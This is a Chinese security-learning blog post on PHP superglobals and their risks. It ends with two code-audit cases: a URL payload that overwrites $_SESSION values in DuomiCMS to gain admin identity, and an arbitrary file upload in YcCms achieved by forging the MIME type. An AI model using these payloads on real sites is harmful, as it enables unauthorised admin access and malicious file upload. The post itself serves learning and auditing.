---
title: PHP应用&原生语法&全局变量&数据接受&身份验证&变量覆盖&任意上传
published: 2026-02-04 12:00:00
description: PHP的变量覆盖安全、数据接受安全、文件上传和身份验证安全，以及两个代码审计（变量覆盖、文件上传）案例。
tags: [Web开发,PHP]
category: 网络安全
draft: false
---

# 知识点

1. 安全开发-原生PHP-超级全局变量
2. 安全开发-原生PHP-代码审计案例

## 安全开发-原生PHP-超级全局变量

### 变量覆盖安全

```php
$GLOBALS：这种全局变量用于在PHP脚本中的任意位置访问全局变量
$$：另一种形式的变量覆盖
```

#### 全局变量

![image-20260204095130612](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260204095130612.png)

#### 可变变量

```php
// $$z = $($z) = $('ya') = $ya = 'cccc'
$z = 'ya';
$ya = 'zzz';
// $ya的值不重要，因为$$总是会执行赋值，无论目标变量是否存在
// 如果目标变量（也就是$ya）不存在那么就会创建，
// 如果目标变量已存在那么就会覆盖。
$$z = 'cccc';

echo $ya;
// 结果为cccc
```

### 数据接收安全

#### $_REQUEST

$_REQUEST 用于收集 HTML 表单提交的数据。（POST和GET都能接收）

#### $_POST

广泛用于收集提交method=“post” 的HTML表单后的表单数据。

#### $_GET

收集URL中的发送的数据。也可用于提交表单数据(method=“get”)

**可以借助hackbar或者发包工具POSTMAN、以及那个新的小黄鸟都能进行post提交。($_COOKIE也同理)**

![image-20260204100652515](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260204100652515.png)

![image-20260204100939789](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260204100939789.png)

#### $_ENV

是一个包含服务器端环境变量的数组。

| 变量名称                        | 变量值含义                                 |
| ------------------------------- | ------------------------------------------ |
| `$_ENV['HTTP_HOST']`            | 客户端请求的主机名。                       |
| `$_ENV['HTTP_USER_AGENT']`      | 发起请求的用户代理（通常包含浏览器信息）。 |
| `$_ENV['HTTP_ACCEPT']`          | 客户端可接受的响应内容类型。               |
| `$_ENV['HTTP_ACCEPT_LANGUAGE']` | 客户端首选的语言。                         |
| `$_ENV['HTTP_ACCEPT_CHARSET']`  | 客户端首选的字符集。                       |
| `$_ENV['REMOTE_ADDR']`          | 访问服务器的客户端的IP地址。               |
| `$_ENV['REMOTE_PORT']`          | 访问服务器的客户端的端口号。               |
| `$_ENV['SERVER_ADDR']`          | 服务器的IP地址。                           |
| `$_ENV['SERVER_PORT']`          | 服务器端口号。                             |
| `$_ENV['SERVER_NAME']`          | 服务器的名称。                             |
| `$_ENV['SERVER_SOFTWARE']`      | 服务器软件名称和版本。                     |
| `$_ENV['DOCUMENT_ROOT']`        | 脚本所在文档根目录。                       |
| `$_ENV['SCRIPT_FILENAME']`      | 当前执行脚本的绝对路径。                   |
| `$_ENV['QUERY_STRING']`         | 查询字符串（当使用 `?` 传递参数时）。      |
| `$_ENV['REQUEST_METHOD']`       | 客户端请求方法（如GET,POST等）。           |

#### $_SERVER

这种超全局变量保存关于报头、路径和脚本位置的信息。

| 变量名称                           | 变量值含义                                                   |
| ---------------------------------- | ------------------------------------------------------------ |
| `$_SERVER['PHP_SELF']`             | 当前执行脚本的文件名，与文档根目录有关。例：http://example.com/test.php中`$_SERVER['PHP_SELF']`的值是：到/test.php。 |
| `$_SERVER['SERVER_NAME']`          | 当前运行脚本所在的服务器的主机名。如果脚本运行于虚拟主机中，该名称是由那个虚拟主机所设置的值决定。 |
| `$_SERVER['SERVER_SOFTWARE']`      | 服务器标识字符串，在响应请求时的头信息中给出。例如：Apache/2.2.24。 |
| `$_SERVER['SERVER_PROTOCOL']`      | 请求页面时通信协议的名称和版本。例如，HTTP/1.0 或 HTTP/1.1。 |
| `$_SERVER['REQUEST_METHOD']`       | 访问页面使用的请求方法；例如，GET, HEAD, POST, PUT等。       |
| `$_SERVER['REQUEST_TIME']`         | 请求开始时的时间戳。从 PHP 5.1.0 起可用。                    |
| `$_SERVER['QUERY_STRING']`         | 查询字符串，如果有的话，通过它进行页面访问。                 |
| `$_SERVER['HTTP_ACCEPT']`          | 当前请求头中Accept项的内容，如果存在的话。                   |
| `$_SERVER['HTTP_ACCEPT_CHARSET']`  | 当前请求头中Accept-Charset:项的内容，如果存在的话。例如：iso-8859-1,*,utf-8。 |
| `$_SERVER['HTTP_HOST']`            | 当前请求头中Host项的内容，如果存在的话。                     |
| `$_SERVER['HTTP_REFERER']`         | 引导用户代理到当前页的前一页的地址（如果存在）。由 user agent 设置决定。 |
| `$_SERVER['HTTP_USER_AGENT']`      | 用户代理发送的User-Agent头信息。如：浏览器信息，IP地址，设备信息等一些与浏览者相关的信息！ |
| `$_SERVER['SCRIPT_NAME']`          | 包含当前脚本的路径。这在页面需要指向自己时非常有用。         |
| `$_SERVER['SERVER_ADDR']`          | 当前运行脚本所在的服务器的 IP 地址。                         |
| `$_SERVER['SERVER_PORT']`          | Web 服务器使用的端口。默认值为80。如果使用 SSL 安全连接，这个值为用户设置的 HTTP 端口，通常是443。 |
| `$_SERVER['SERVER_SIGNATURE']`     | 包含了服务器版本和虚拟主机名的字符串。                       |
| `$_SERVER['PATH_TRANSLATED']`      | 当前脚本所在文件系统（非文档根目录）的基本路径。这是在服务器进行虚拟到真实路径的映像后的结果。 |
| `$_SERVER['SCRIPT_FILENAME']`      | 当前执行脚本的绝对路径。                                     |
| `$_SERVER['SERVER_ADMIN']`         | 该值指明了 Apache 服务器配置文件中的 `SERVER_ADMIN` 参数。如果脚本运行在一个虚拟主机上，则该值是那个虚拟主机的值。 |
| `$_SERVER['HTTP_X_FORWARDED_FOR']` | 代理服务器发送的 IP 地址，通常用于识别客户端的原始 IP 地址。 |
| `$_SERVER['REMOTE_ADDR']`          | 浏览当前页面的用户的 IP 地址。如果用户使用了代理IP，则需要使用`$_SERVER['HTTP_X_FORWARDED_FOR']`来准确获取！ |
| `$_SERVER['REMOTE_USER']`          | 当使用身份验证（如使用 Basic 身份验证时），包含通过身份验证的用户名。 |
| `$_SERVER['HTTPS']`                | 用于标识请求是通过 HTTPS 协议发送的。                        |
| `$_SERVER['REDIRECT_URL']`         | 原始请求被重定向到的 URL。                                   |
| `$_SERVER['HTTP_REFERER']`         | 用户最后一次离开的页面的 URL。这可能不准确，因为用户可以更改或禁用它。 |
| `$_SERVER['CONTENT_LENGTH']`       | 请求主体的大小（以字节为单位）。                             |
| `$_SERVER['CONTENT_TYPE']`         | 请求主体的内容类型（如 "application/x-www-form-urlencoded" 或 "multipart/form-data"）。 |

### 文件上传安全

```php
$_FILES：文件上传且处理包含通过POST方法上传给当前脚本的文件内容。
```

| 变量名称              | 变量值含义                       |
| --------------------- | -------------------------------- |
| `$_FILES["name"]`     | 上传文件的名称                   |
| `$_FILES["type"]`     | 上传文件的类型                   |
| `$_FILES["tmp_name"]` | 文件被上传到服务器上的临时文件名 |
| `$_FILES["error"]`    | 上传文件时可能出现的错误代码     |
| `$_FILES["size"]`     | 上传文件的大小                   |
| `$_FILES["tmpDir"]`   | 上传文件的临时存储目录           |

![image-20260204104854209](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260204104854209.png)

上传时，进行抓包，可以修改文件类型等信息，一般都是用于在上传文件类型有限制时，进行使用。

![image-20260204105733208](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260204105733208.png)

### 身份验证安全

#### $_COOKIE

是一个关联数组，包含通过cookie传递给当前脚本的内容。
本地客户端浏览器存储

```php
$username = $_COOKIE['username'];
setcookie("username", $username."binggan", time() + 3600);
```

#### $_SESSION

是一个关联数组，包含当前脚本中的所有session内容。
目标服务端存储，存储记录的数据

```php
session_start();
$_SESSION['username'] = 'admin';
echo 'welcome '.$_SESSION['username'];
```

![image-20260204112756198](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260204112756198.png)

![image-20260204113012576](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260204113012576.png)

## 安全开发-原生PHP-代码审计案例

### DuomiCMS变量覆盖

#### 文章参考

https://blog.csdn.net/qq_59023242/article/details/135080259

```
找变量覆盖代码->找此文件被谁调用->选择利用覆盖Session->找开启Session文件覆盖条件
```

![image-20260204114544437](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260204114544437.png)

#### payload

```php
/interface/comment.php?_SESSION[duomi_admin_id]=10&_SESSION[duomi_group_id]=1&_SESSION[duomi_admin_name]=zmh
/interface/comment.php?
// 实际上后拼的参数为：
$_SESSION[duomi_admin_id]=10
$_SESSION[duomi_group_id]=1	// 管理员身份
$_SESSION[duomi_admin_name]=zmh	// 名字随意
```

```
必要条件
存在可以利用变量覆盖的xxx.php代码
且引用xxx.php的目标代码中包含session start();
```

![image-20260204133947693](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260204133947693.png)

![image-20260204134001152](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260204134001152.png)

![image-20260204133923252](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260204133923252.png)

### YcCms任意文件上传

#### 文章参考

https://zhuanlan.zhihu.com/p/718742254

```
找文件上传代码->找此文件调用->找函数调用->过滤type用mime绕过
```

其实就是抓包修改上传文件的后缀，源代码中类型校验只需要为image/png,image/x-png。

#### payload

```
?a=call&m=upLoad
```

![image-20260204135820236](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260204135820236.png)

![image-20260204135917162](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260204135917162.png)

![image-20260204135926574](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260204135926574.png)

![image-20260204135935517](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260204135935517.png)

![image-20260204135944192](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260204135944192.png)